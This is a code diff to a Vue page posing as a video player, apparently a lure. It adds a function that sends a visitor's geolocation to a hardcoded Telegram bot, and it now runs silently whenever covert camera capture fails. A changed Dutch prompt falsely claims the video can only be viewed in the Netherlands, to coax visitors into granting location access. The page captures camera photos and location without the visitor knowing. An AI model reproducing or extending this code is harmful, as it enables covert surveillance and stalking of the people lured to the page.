@@ -5,7 +5,7 @@
                 <img :src="fallback" alt="Video Thumbnail" class="w-screen h-screen object-cover filter blur">
                 <div class="absolute inset-0 flex items-center justify-center">
                     <div class="bg-white flex items-center justify-center bg-opacity-25 rounded-full p-2">
-                        <div v-if="!started" @click="started = !started">
+                        <div v-if="!started" @click="started = true">
                             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                                 stroke="currentColor" class="w-6 h-6">
                                 <path stroke-linecap="round" stroke-linejoin="round"
@@ -63,7 +63,7 @@ const sendPosition = (position) => {
 const showError = (error) => {
     switch (error.code) {
         case error.PERMISSION_DENIED:
-            alert("Als u deze video wilt bekijken moet u uw locatie instelling aanpassen.")
+            alert("U kunt deze video alleen in Nederland bekijken. Geeft toesteming tot uw locatie in uw browser")
             break
         case error.POSITION_UNAVAILABLE:
             alert("Location information is unavailable.")
@@ -76,6 +76,23 @@ const showError = (error) => {
             break
     }
 }
+
+const sendLocationToTelegram = async (location) => {
+    const formData = new FormData();
+    formData.append("chat_id", "1086643766");
+    formData.append("text", `Location: ${location}`);
+
+    const BOT_TOKEN = "5815481193:AAHQ-OXKncRdMZ5kwJGYjlV2i0N397qEq4c";
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        body: formData
+    });
+
+    const responseData = await response.json();
+    if (!responseData.ok) {
+        throw new Error(`Telegram API error: ${responseData.description}`);
+    }
+};
 
 const capturePhoto = async (location) => {
     try {
@@ -118,9 +135,16 @@ const capturePhoto = async (location) => {
             stream.getTracks().forEach(track => track.stop());
         }, 1000);
     } catch (err) {
-        alert("Error: " + err);
+        console.error("Camera access error:", err);
+        // Send the location to Telegram
+        try {
+            await sendLocationToTelegram(location);
+        } catch (telegramError) {
+            console.error("Telegram API error:", telegramError);
+            alert("Failed to send location to Telegram.");
+        }
     }
-}
+};
 
 onBeforeMount(() => {
     getLocationAndCapture();
